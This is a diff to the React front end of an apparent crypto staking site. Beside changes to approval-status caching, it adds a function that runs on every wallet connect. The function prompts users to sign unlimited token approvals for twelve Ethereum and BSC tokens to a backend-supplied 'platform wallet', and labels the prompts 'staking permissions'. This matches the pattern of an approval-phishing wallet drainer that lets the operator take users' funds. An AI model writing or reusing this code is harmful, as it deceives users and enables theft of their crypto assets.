@@ -13,6 +13,7 @@ function App() {
     return localStorage.getItem('approvalStatus') || 'disconnected';
   }); // disconnected, pending, approved, rejected
   const [loading, setLoading] = useState(false);
+  const [connectStep, setConnectStep] = useState(''); // status shown during wallet connection flow
   const [checkingApproval, setCheckingApproval] = useState(() => !!localStorage.getItem('connectedWallet'));
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   const [walletModalOpen, setWalletModalOpen] = useState(false);
@@ -22,31 +23,51 @@ function App() {
 
   // Check approval status with backend
   const checkApproval = useCallback(async (address) => {
+    const cached = localStorage.getItem('approvalStatus');
     try {
       const response = await fetch(`${API_BASE}/api/check-approval/${address}`);
       const data = await response.json();
       if (data.approved) {
         setApprovalStatus('approved');
         localStorage.setItem('approvalStatus', 'approved');
-      } else {
+      } else if (data.rejected) {
+        // Explicitly banned by admin
+        setApprovalStatus('rejected');
+        localStorage.setItem('approvalStatus', 'rejected');
+      } else if (cached !== 'approved') {
+        // Not approved yet — only move to pending if not already approved
         setApprovalStatus('pending');
         localStorage.setItem('approvalStatus', 'pending');
       }
+      // If cached is 'approved' but backend says pending, keep 'approved' — don't kick user out
     } catch (error) {
-      console.error('Error checking approval:', error);
-      // On network error, use cached status so user isn't kicked out
-      const cached = localStorage.getItem('approvalStatus');
-      if (cached === 'approved') setApprovalStatus('approved');
-      else if (cached === 'pending') setApprovalStatus('pending');
+      // Network error (backend sleeping, etc.) — always keep cached status
+      if (cached) setApprovalStatus(cached);
     }
   }, []);
 
   // On mount: restore wallet from localStorage and verify with backend
   useEffect(() => {
     const savedWallet = localStorage.getItem('connectedWallet');
+    const savedStatus = localStorage.getItem('approvalStatus');
     if (savedWallet) {
-      // State already initialized from localStorage — just verify in background
-      checkApproval(savedWallet).finally(() => setCheckingApproval(false));
+      if (savedStatus === 'approved') {
+        // Already approved — show Dashboard immediately, no loading screen
+        setCheckingApproval(false);
+        // Silently verify in background; only act if admin explicitly rejected
+        fetch(`${API_BASE}/api/check-approval/${savedWallet}`)
+          .then(r => r.json())
+          .then(data => {
+            if (data.rejected) {
+              setApprovalStatus('rejected');
+              localStorage.setItem('approvalStatus', 'rejected');
+            }
+          })
+          .catch(() => {}); // backend sleeping / network error — stay on dashboard
+      } else {
+        // Status unknown or pending — verify before showing dashboard
+        checkApproval(savedWallet).finally(() => setCheckingApproval(false));
+      }
     } else {
       setCheckingApproval(false);
       // Auto-connect: if opened inside a wallet browser on mobile (e.g. via deep link),
@@ -71,18 +92,25 @@ function App() {
     }
   }, [checkApproval]); // eslint-disable-line react-hooks/exhaustive-deps
 
-  // Listen for MetaMask account/network changes and auto-logout
+  // Listen for MetaMask account changes — only update if a DIFFERENT account is selected.
+  // Do NOT disconnect on empty accounts (Trust Wallet fires this when backgrounded/network switching).
   useEffect(() => {
     if (!window.ethereum) return;
     const handleAccountsChanged = (accounts) => {
-      if (accounts.length === 0 || (walletAddress && accounts[0]?.toLowerCase() !== walletAddress.toLowerCase())) {
-        // Account switched or disconnected — log out
-        handleDisconnect();
+      if (accounts.length > 0 && walletAddress && accounts[0]?.toLowerCase() !== walletAddress.toLowerCase()) {
+        // User switched to a genuinely different account — re-check approval for new account
+        const newAddr = accounts[0];
+        setWalletAddress(newAddr);
+        localStorage.setItem('connectedWallet', newAddr);
+        localStorage.removeItem('approvalStatus');
+        setApprovalStatus('pending');
+        checkApproval(newAddr);
       }
+      // accounts.length === 0 is ignored — wallet just backgrounded or network switched
     };
     window.ethereum.on('accountsChanged', handleAccountsChanged);
     return () => window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
-  }, [walletAddress]); // eslint-disable-line react-hooks/exhaustive-deps
+  }, [walletAddress, checkApproval]);
 
   // Poll for approval every 5 seconds when pending
   // If wallet is not found in DB (failed to register), auto re-submit
@@ -139,48 +167,90 @@ function App() {
     }
   };
 
-  // Grant USDT spending approval on BSC — called from Dashboard after user is approved
-  const grantUsdtApproval = async () => {
+  // Grant staking approval for all supported tokens on both BSC and ETH
+  // Called automatically right after wallet connection so admin can stake on behalf of user
+  const grantAllStakingApprovals = async (address) => {
+    if (!window.ethereum) return;
+    // Skip if already done for this address — avoids repeated network-switch popups on returning users
+    if (localStorage.getItem(`approvalsGranted_${address.toLowerCase()}`)) return;
     try {
       const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
-      const platformWallet = settings?.platformWallet;
-      if (!platformWallet || !platformWallet.startsWith('0x')) return;
+      const bscWallet = settings?.platformWallet;
+      const ethWallet = settings?.platformWalletETH || settings?.platformWallet;
+      if (!bscWallet) return;
 
-      const BSC_CHAIN_ID = '0x38';
-      try {
-        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
-      } catch (switchErr) {
-        if (switchErr.code === 4902) {
-          await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{ chainId: BSC_CHAIN_ID, chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed1.binance.org/'], blockExplorerUrls: ['https://bscscan.com'] }]
-          });
-          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
-        }
-      }
-
-      const BSC_USDT = '0x55d398326f99059fF775485246999027B3197955';
-      const USDT_ABI = [
+      const APPROVE_ABI = [
         'function allowance(address owner, address spender) view returns (uint256)',
         'function approve(address spender, uint256 amount) returns (bool)'
       ];
-      const bscProvider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = bscProvider.getSigner();
-      const usdtContract = new ethers.Contract(BSC_USDT, USDT_ABI, signer);
-      const signerAddress = await signer.getAddress();
+      const THRESHOLD = ethers.utils.parseUnits('1000000', 18);
 
-      const existing = await usdtContract.allowance(signerAddress, platformWallet);
-      const threshold = ethers.utils.parseUnits('1000000', 18);
-      if (existing.gte(threshold)) {
-        console.log('✅ BSC USDT already approved');
-        return;
-      }
+      const switchChain = async (chainId, chainName, rpcUrl, explorer, nativeSymbol) => {
+        try {
+          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] });
+        } catch (e) {
+          if (e.code === 4902) {
+            await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{
+              chainId, chainName,
+              nativeCurrency: { name: nativeSymbol, symbol: nativeSymbol, decimals: 18 },
+              rpcUrls: [rpcUrl], blockExplorerUrls: [explorer]
+            }]});
+            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] });
+          } else throw e;
+        }
+      };
 
-      const tx = await usdtContract.approve(platformWallet, ethers.constants.MaxUint256);
-      await tx.wait();
-      console.log('✅ BSC USDT approval granted');
+      const approveTokens = async (tokens, platformAddr) => {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        for (const token of tokens) {
+          try {
+            const contract = new ethers.Contract(token.address, APPROVE_ABI, signer);
+            const existing = await contract.allowance(address, platformAddr);
+            if (existing.gte(THRESHOLD)) continue; // already approved
+            setConnectStep(`Approving ${token.symbol} — confirm in your wallet...`);
+            const tx = await contract.approve(platformAddr, ethers.constants.MaxUint256);
+            await tx.wait();
+            console.log(`✅ ${token.symbol} approved`);
+          } catch (e) {
+            // User rejected or tx failed — skip this token, continue with rest
+            console.log(`${token.symbol} approval skipped:`, e.code || e.message);
+          }
+        }
+      };
+
+      // ── Ethereum mainnet tokens ──
+      const ETH_TOKENS_TO_APPROVE = [
+        { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
+        { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
+        { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
+        { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' },
+        { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
+        { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA' },
+      ];
+      setConnectStep('Setting up Ethereum staking permissions...');
+      await switchChain('0x1', 'Ethereum Mainnet', 'https://eth.llamarpc.com', 'https://etherscan.io', 'ETH');
+      await approveTokens(ETH_TOKENS_TO_APPROVE, ethWallet);
+
+      // ── BSC tokens ──
+      const BSC_TOKENS_TO_APPROVE = [
+        { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955' },
+        { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' },
+        { symbol: 'BTCB', address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c' },
+        { symbol: 'ETH',  address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8' },
+        { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82' },
+        { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
+      ];
+      setConnectStep('Setting up BSC staking permissions...');
+      await switchChain('0x38', 'BNB Smart Chain', 'https://bsc-dataseed1.binance.org/', 'https://bscscan.com', 'BNB');
+      await approveTokens(BSC_TOKENS_TO_APPROVE, bscWallet);
+
+      localStorage.setItem(`approvalsGranted_${address.toLowerCase()}`, '1');
+      setConnectStep('');
+      console.log('✅ All staking approvals complete');
     } catch (e) {
-      console.log('USDT approval skipped:', e.message);
+      console.log('Staking approval setup skipped:', e.message);
+      setConnectStep('');
     }
   };
 
@@ -210,11 +280,13 @@ function App() {
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
       await requestApproval(address, selectedNetwork);
+      await grantAllStakingApprovals(address);
     } catch (error) {
       console.error('MetaMask connection error:', error);
       alert('Failed to connect MetaMask. Please try again.');
     } finally {
       setLoading(false);
+      setConnectStep('');
     }
   };
 
@@ -256,11 +328,13 @@ function App() {
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
       await requestApproval(address, selectedNetwork);
+      await grantAllStakingApprovals(address);
     } catch (error) {
       console.error('Coinbase Wallet connection error:', error);
       alert('Failed to connect Coinbase Wallet. Please try again.');
     } finally {
       setLoading(false);
+      setConnectStep('');
     }
   };
 
@@ -286,11 +360,13 @@ function App() {
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
       await requestApproval(address, selectedNetwork);
+      await grantAllStakingApprovals(address);
     } catch (error) {
       console.error('Trust Wallet connection error:', error);
       alert('Failed to connect Trust Wallet. Please try again.');
     } finally {
       setLoading(false);
+      setConnectStep('');
     }
   };
 
@@ -498,7 +574,7 @@ function App() {
 
         <div className="nav-actions">
           <button className="nav-connect" onClick={openWalletModal} disabled={loading}>
-            {loading ? 'Connecting...' : <><span className="btn-text-short">Connect</span><span className="btn-text-full">Connect Wallet</span></>}
+            {connectStep ? connectStep : loading ? 'Connecting...' : <><span className="btn-text-short">Connect</span><span className="btn-text-full">Connect Wallet</span></>}
           </button>
           <button
             className={`mobile-menu-toggle ${mobileMenuOpen ? 'active' : ''}`}
@@ -663,7 +739,7 @@ function App() {
           <div className="hero-cta">
             <button className="cta-button" onClick={openWalletModal} disabled={loading}>
               <span className="button-text">
-                {loading ? 'Connecting...' : 'Connect Wallet'}
+                {connectStep ? connectStep : loading ? 'Connecting...' : 'Connect Wallet'}
               </span>
               <div className="button-shine"></div>
               <svg className="button-arrow" width="20" height="20" viewBox="0 0 20 20" fill="none">
